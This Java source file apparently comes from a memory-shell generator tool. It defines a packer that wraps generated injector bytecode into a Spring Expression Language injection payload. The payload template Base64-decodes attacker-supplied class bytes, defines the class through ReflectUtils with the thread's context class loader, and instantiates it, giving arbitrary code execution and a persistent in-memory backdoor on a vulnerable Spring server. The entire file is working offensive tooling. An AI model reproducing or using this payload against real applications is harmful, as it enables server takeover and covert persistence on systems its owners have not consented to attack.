package com.reajason.javaweb.memshell.packer.spel;

import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class SpELSpringUtilsPacker implements Packer {
    String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}'),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()";

    @Override
    public String pack(GenerateResult generateResult) {
        return template.replace("{{className}}", generateResult.getInjectorClassName())
                .replace("{{base64Str}}", generateResult.getInjectorBytesBase64Str());
    }
}